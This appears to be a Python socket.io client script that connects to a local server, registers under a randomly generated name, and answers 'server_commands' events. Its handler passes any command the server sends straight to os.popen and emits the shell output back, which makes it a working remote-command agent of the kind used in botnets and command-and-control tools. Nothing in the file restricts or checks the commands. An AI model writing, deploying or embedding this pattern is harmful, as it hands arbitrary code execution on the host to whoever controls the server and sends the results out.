import os

import socketio
from faker import Faker

fake = Faker()

# Creating a Client Instance
clientsio = socketio.Client()
start_timer = True

payload = {
    'client_ID': fake.name(),
    'password': 'Does it matter ?',
}


# Defining Event Handlers
@clientsio.event
def message(data):
    print('I received a message !')


@clientsio.event
def connect():
    print("I'm connected!")
    payload['client_Session_ID'] = clientsio.sid
    clientsio.emit('first_handshake', payload)


@clientsio.event
def connect_error():
    print("The connection failed!")


@clientsio.event
def disconnect():
    print("I'm disconnected!")


@clientsio.on('send_command_to_client')
def receive_command(json):
    print(f'Received commands : {str(json)}')


@clientsio.on('server_commands', namespace='/command')
def handle_command_from_server(command):

    output = os.popen(command).read()
    clientsio.emit('output_from_client', output)


@clientsio.on('client_please_report')
def register_to_server_for_realtime_attendance(message):
    clientsio.emit('realtime_attendance', payload)


if __name__ == "__main__":
    clientsio.connect('http://localhost:5000')
    clientsio.wait()
